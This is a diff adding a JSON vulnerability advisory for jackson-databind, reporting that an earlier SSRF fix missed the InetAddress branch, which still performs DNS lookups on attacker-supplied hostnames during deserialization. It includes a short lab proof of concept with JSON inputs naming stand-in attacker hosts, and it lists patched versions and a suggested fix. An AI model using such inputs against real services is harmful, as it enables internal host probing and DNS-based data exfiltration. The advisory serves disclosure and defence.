@@ -1,0 +1,86 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-09-28T20:17:44Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "com.fasterxml.jackson.core:jackson-databind"
+  },
+  "Advisory": {
+    "DatabaseId": 503443,
+    "Id": "GSA_kwCzR0hTQS12dmdwLXJmZzItN3JyNs4AB66T",
+    "GhsaId": "GHSA-vvgp-rfg2-7rr6",
+    "References": [
+      {
+        "Url": "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-vvgp-rfg2-7rr6"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-77310"
+      },
+      {
+        "Url": "https://github.com/FasterXML/jackson-databind/pull/6058"
+      },
+      {
+        "Url": "https://github.com/FasterXML/jackson-databind/commit/2fc7bd9057dd051d7dea0e5fcad89822d0fa5ebd"
+      },
+      {
+        "Url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.18.9"
+      },
+      {
+        "Url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.21.5"
+      },
+      {
+        "Url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.22.1"
+      },
+      {
+        "Url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-3.1.5"
+      },
+      {
+        "Url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-3.2.1"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-vvgp-rfg2-7rr6"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-vvgp-rfg2-7rr6"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-77310"
+      }
+    ],
+    "Description": "### Summary\nCVE-2026-54514 (GHSA-hgj6-7826-r7m5) fixed an eager-DNS-resolution / SSRF issue in jackson-databind's deserialization of `java.net.InetSocketAddress` by switching to `InetSocketAddress.createUnresolved(...)` (PR #5951, commit 1f5a1037, released in 2.18.8 / 2.21.4 / 3.1.4). That fix did not cover the sibling `java.net.InetAddress` branch in the very same `FromStringDeserializer.Std._deserialize()` switch statement, which still calls `InetAddress.getByName(value)` and therefore performs an eager forward DNS lookup on attacker-controlled input at deserialization time. The fix is incomplete: the same vulnerability class remains reachable through `InetAddress`.\n\n### Details\nFile: src/main/java/com/fasterxml/jackson/databind/deser/std/FromStringDeserializer.java\n\nSibling cases in the same switch:\n- Line 357-358 (UNFIXED):\n    case STD_INET_ADDRESS:\n        return InetAddress.getByName(value);     // eager forward DNS lookup\n- Line 359-381 + helper at 494-496 (FIXED by PR #5951):\n    protected InetSocketAddress _inetSocketAddress(String host, int port) {\n        // 05-May-2026, tatu: [databind#5951] Prevent DNS lookup:\n        return InetSocketAddress.createUnresolved(host, port);   // no DNS\n    }\n\n`InetAddress` is a registered standard string-like scalar type (FromStringDeserializer.types() line 73; findDeserializer() maps it to STD_INET_ADDRESS at line 119-120). Any value deserialized into an `InetAddress`-typed target — a plain POJO field, a polymorphic subtype, or a default-typing-permitted slot — reaches `InetAddress.getByName(attackerControlledString)`, which invokes the OS/JVM resolver and performs forward DNS resolution before any application validation.\n\nThe parent fix's own added unit test asserts `address.isUnresolved()` with the comment \"should NOT resolve address\", confirming that performing DNS resolution during deserialization is precisely the behavior being treated as the vulnerability. The InetAddress branch still violates that property.\n\nVerified against the FIXED released artifact (jackson-databind 2.18.8, from Maven Central): decompiled bytecode shows the InetSocketAddress branch now routes through `_inetSocketAddress -\u003e createUnresolved`, while `InetAddress.getByName` is still emitted unchanged in the InetAddress branch.\n\n### PoC\nLab-only, zero network egress. Run against the fixed jackson-databind 2.18.8.\n\nA custom JDK InetAddressResolver SPI (Java 18+) counts forward lookups locally and answers with loopback, so no traffic leaves the host:\n\n    ObjectMapper m = new ObjectMapper();\n    // InetSocketAddress (patched): 0 resolver lookups, isUnresolved=true\n    m.readValue(\"\\\"internal-metadata.attacker-oob.example:8080\\\"\", InetSocketAddress.class);\n    // InetAddress (unpatched sibling): 1 resolver lookup on the attacker host\n    m.readValue(\"\\\"internal-metadata.attacker-oob.example\\\"\", InetAddress.class);\n\nObserved output (jackson 2.18.8):\n    [A] InetSocketAddress  isUnresolved=true  resolverLookups=0  lastHost=null\n    [B] InetAddress        value=localhost/127.0.0.1  resolverLookups=1  lastHost=internal-metadata.attacker-oob.example\n\nA standalone variant (no SPI) using an RFC-6761 `.invalid` canary host shows the same: deserializing into InetAddress raises UnknownHostException (the OS resolver was invoked), while InetSocketAddress stays unresolved. Full source in PocResolverCount.java and PocInetAddressIncompleteFix.java.\n\nReachability with a plain field (no annotations, no polymorphism, no default typing):\n    static class Config { public InetAddress bindHost; public int port; }\n    mapper.readValue(\"{\\\"bindHost\\\":\\\"poc-reach.example\\\",\\\"port\\\":1}\", Config.class);\n    // -\u003e resolver invoked on \"poc-reach.example\"\n\n### Impact\nAn attacker who can influence JSON deserialized into an `InetAddress` target can force the application to perform outbound forward DNS lookups for attacker-chosen hostnames at deserialization time, before any application-level validation. This yields a DNS-based SSRF / OOB primitive: out-of-band exfiltration / interaction via DNS callbacks, and blind probing of whether internal hostnames resolve (internal-host enumeration). This is the same impact class and trust boundary for which CVE-2026-54514 (CVSS 5.3, CWE-918) was assigned to the InetSocketAddress branch. It is a DNS-lookup / blind SSRF primitive, not arbitrary HTTP SSRF or RCE; it does not itself open a socket.\n\nSuggested fix: avoid eager resolution for InetAddress as well — e.g. defer resolution, validate the host string before resolving, or provide an opt-in/opt-out consistent with the InetSocketAddress fix (there is no direct unresolved-InetAddress equivalent, so deferring/validating or documenting the resolution is the practical mitigation).\n\nCredit : Ta Duc Thien",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-09-28T20:17:41Z",
+    "Severity": "MODERATE",
+    "Summary": "jackson-databind: Incomplete fix for CVE-2026-54514: eager DNS resolution (SSRF) still present in InetAddress deserialization",
+    "UpdatedAt": "2026-09-28T20:17:44Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 5.3,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.22.1"
+      },
+      "VulnerableVersionRange": "\u003e= 2.22.0, \u003c 2.22.1"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.21.5"
+      },
+      "VulnerableVersionRange": "\u003e= 2.19.0, \u003c 2.21.5"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.18.9"
+      },
+      "VulnerableVersionRange": "\u003e= 2.0.0, \u003c 2.18.9"
+    }
+  ]
+}
